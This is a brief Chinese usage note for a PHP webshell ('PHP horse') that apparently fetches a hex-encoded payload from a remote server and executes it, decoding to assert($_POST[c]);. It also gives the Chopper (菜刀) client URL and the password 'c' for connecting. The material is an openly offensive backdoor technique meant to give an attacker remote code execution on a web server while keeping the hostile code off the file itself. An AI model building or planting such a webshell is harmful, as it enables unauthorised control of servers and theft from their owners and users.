## 使用说明

> 写了两个脚本webshell.php和getcode.php(本地开了个php server，运行getcode.php模拟远程服务器上的网页)

> 原理：首先用菜刀访问webshell.php，该webshell立即从远程服务器上获取要运行的代码并执行。

> 这里获取的代码是61737365727428245f504f53545b635d293b，也就是assert($_POST[c]);

> 菜刀中设置：http://192.168.1.102/DebugPHP/webshell.php 密码是c

author ：tank96a
form : http://tank96a.github.io/article/2015/04/27/php-horse/
